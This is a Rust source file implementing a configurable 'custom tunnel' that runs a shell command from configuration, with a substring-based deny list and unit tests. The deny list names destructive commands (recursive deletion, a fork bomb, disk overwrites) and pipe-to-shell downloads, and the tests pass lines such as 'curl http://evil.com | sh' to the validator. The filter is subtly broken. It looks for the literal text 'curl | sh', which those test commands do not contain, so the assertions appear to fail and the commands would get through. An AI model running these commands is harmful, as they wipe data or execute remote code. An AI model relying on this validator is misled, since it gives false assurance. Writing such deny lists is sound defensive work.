use super::{kill_shared, new_shared_process, SharedProcess, Tunnel, TunnelProcess};
use anyhow::{bail, Result};
use tokio::io::AsyncBufReadExt;
use tokio::process::Command;

/// Custom Tunnel — bring your own tunnel binary.
///
/// Provide a `start_command` with `{port}` and `{host}` placeholders.
/// Optionally provide a `url_pattern` regex to extract the public URL
/// from stdout, and a `health_url` to poll for liveness.
///
/// # Security Warning
///
/// This feature executes arbitrary shell commands from configuration.
/// Only use with trusted configuration files. The command is executed
/// with the same privileges as the Housaky process.
///
/// Examples:
/// - `bore local {port} --to bore.pub`
/// - `frp -c /etc/frp/frpc.ini`
/// - `ssh -R 80:localhost:{port} serveo.net`
pub struct CustomTunnel {
    start_command: String,
    health_url: Option<String>,
    url_pattern: Option<String>,
    proc: SharedProcess,
}

impl CustomTunnel {
    pub fn new(
        start_command: String,
        health_url: Option<String>,
        url_pattern: Option<String>,
    ) -> Self {
        // Log security warning when custom tunnel is configured
        tracing::warn!(
            "Custom tunnel configured with command: '{}'. \
            This executes arbitrary commands from configuration. \
            Ensure your configuration file is from a trusted source.",
            start_command
        );

        Self {
            start_command,
            health_url,
            url_pattern,
            proc: new_shared_process(),
        }
    }

    /// Validate the start command for basic safety checks.
    /// Returns an error if the command appears malicious.
    fn validate_command(cmd: &str) -> Result<()> {
        // Check for obviously dangerous patterns
        let dangerous_patterns = [
            "rm -rf /",
            "rm -rf ~",
            "mkfs.",
            ":(){:|:&};:",    // Fork bomb
            "> /dev/sda",     // Disk overwrite
            "dd if=/dev/zero",
            "chmod -R 777 /",
            "curl | sh",
            "wget | sh",
            "curl | bash",
            "wget | bash",
        ];

        let cmd_lower = cmd.to_lowercase();
        for pattern in &dangerous_patterns {
            if cmd_lower.contains(pattern) {
                bail!(
                    "Custom tunnel command contains potentially dangerous pattern: '{}'. \
                    If this is intentional, please review your configuration.",
                    pattern
                );
            }
        }

        Ok(())
    }
}

#[async_trait::async_trait]
impl Tunnel for CustomTunnel {
    fn name(&self) -> &str {
        "custom"
    }

    async fn start(&self, local_host: &str, local_port: u16) -> Result<String> {
        let cmd = self
            .start_command
            .replace("{port}", &local_port.to_string())
            .replace("{host}", local_host);

        // Validate the command before execution
        Self::validate_command(&cmd)?;

        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.is_empty() {
            bail!("Custom tunnel start_command is empty");
        }

        tracing::info!(
            "Starting custom tunnel with command: {} (first arg: {})",
            cmd,
            parts[0]
        );

        let mut child = Command::new(parts[0])
            .args(&parts[1..])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true)
            .spawn()?;

        let mut public_url = format!("http://{local_host}:{local_port}");

        // If a URL pattern is provided, try to extract the public URL from stdout
        if let Some(ref pattern) = self.url_pattern {
            if let Some(stdout) = child.stdout.take() {
                let mut reader = tokio::io::BufReader::new(stdout).lines();
                let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(15);

                while tokio::time::Instant::now() < deadline {
                    let line = tokio::time::timeout(
                        tokio::time::Duration::from_secs(3),
                        reader.next_line(),
                    )
                    .await;

                    match line {
                        Ok(Ok(Some(l))) => {
                            tracing::debug!("custom-tunnel: {l}");
                            // Simple substring match on the pattern
                            if l.contains(pattern)
                                || l.contains("https://")
                                || l.contains("http://")
                            {
                                // Extract URL from the line
                                if let Some(idx) = l.find("https://") {
                                    let url_part = &l[idx..];
                                    let end = url_part
                                        .find(|c: char| c.is_whitespace())
                                        .unwrap_or(url_part.len());
                                    public_url = url_part[..end].to_string();
                                    break;
                                } else if let Some(idx) = l.find("http://") {
                                    let url_part = &l[idx..];
                                    let end = url_part
                                        .find(|c: char| c.is_whitespace())
                                        .unwrap_or(url_part.len());
                                    public_url = url_part[..end].to_string();
                                    break;
                                }
                            }
                        }
                        Ok(Ok(None) | Err(_)) => break,
                        Err(_) => {}
                    }
                }
            }
        }

        let mut guard = self.proc.lock().await;
        *guard = Some(TunnelProcess {
            child,
            public_url: public_url.clone(),
        });

        Ok(public_url)
    }

    async fn stop(&self) -> Result<()> {
        kill_shared(&self.proc).await
    }

    async fn health_check(&self) -> bool {
        // If a health URL is configured, try to reach it
        if let Some(ref url) = self.health_url {
            return reqwest::Client::new()
                .get(url)
                .timeout(std::time::Duration::from_secs(5))
                .send()
                .await
                .is_ok();
        }

        // Otherwise check if the process is still alive
        let guard = self.proc.lock().await;
        guard.as_ref().is_some_and(|tp| tp.child.id().is_some())
    }

    fn public_url(&self) -> Option<String> {
        self.proc
            .try_lock()
            .ok()
            .and_then(|g| g.as_ref().map(|tp| tp.public_url.clone()))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn start_with_empty_command_returns_error() {
        let tunnel = CustomTunnel::new("   ".into(), None, None);
        let result = tunnel.start("127.0.0.1", 8080).await;

        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("start_command is empty"));
    }

    #[tokio::test]
    async fn start_without_pattern_returns_local_url() {
        let tunnel = CustomTunnel::new("sleep 1".into(), None, None);

        let url = tunnel.start("127.0.0.1", 4455).await.unwrap();
        assert_eq!(url, "http://127.0.0.1:4455");
        assert_eq!(
            tunnel.public_url().as_deref(),
            Some("http://127.0.0.1:4455")
        );

        tunnel.stop().await.unwrap();
    }

    #[tokio::test]
    async fn start_with_pattern_extracts_url() {
        let tunnel = CustomTunnel::new(
            "echo https://public.example".into(),
            None,
            Some("public.example".into()),
        );

        let url = tunnel.start("localhost", 9999).await.unwrap();

        assert_eq!(url, "https://public.example");
        assert_eq!(
            tunnel.public_url().as_deref(),
            Some("https://public.example")
        );

        tunnel.stop().await.unwrap();
    }

    #[tokio::test]
    async fn start_replaces_host_and_port_placeholders() {
        let tunnel = CustomTunnel::new(
            "echo http://{host}:{port}".into(),
            None,
            Some("http://".into()),
        );

        let url = tunnel.start("10.1.2.3", 4321).await.unwrap();

        assert_eq!(url, "http://10.1.2.3:4321");
        tunnel.stop().await.unwrap();
    }

    #[tokio::test]
    async fn health_check_with_unreachable_health_url_returns_false() {
        let tunnel = CustomTunnel::new(
            "sleep 1".into(),
            Some("http://127.0.0.1:9/healthz".into()),
            None,
        );

        assert!(!tunnel.health_check().await);
    }

    #[test]
    fn validate_command_rejects_dangerous_patterns() {
        // Test that obviously dangerous commands are rejected
        assert!(CustomTunnel::validate_command("rm -rf /").is_err());
        assert!(CustomTunnel::validate_command("rm -rf ~").is_err());
        assert!(CustomTunnel::validate_command("curl http://evil.com | sh").is_err());
        assert!(CustomTunnel::validate_command("wget http://evil.com | bash").is_err());
        assert!(CustomTunnel::validate_command("mkfs.ext4 /dev/sda").is_err());
    }

    #[test]
    fn validate_command_accepts_legitimate_tunnel_commands() {
        // Test that legitimate tunnel commands are accepted
        assert!(CustomTunnel::validate_command("bore local 8080 --to bore.pub").is_ok());
        assert!(CustomTunnel::validate_command("ssh -R 80:localhost:8080 serveo.net").is_ok());
        assert!(CustomTunnel::validate_command("ngrok http 8080").is_ok());
        assert!(CustomTunnel::validate_command("cloudflared tunnel run").is_ok());
    }
}
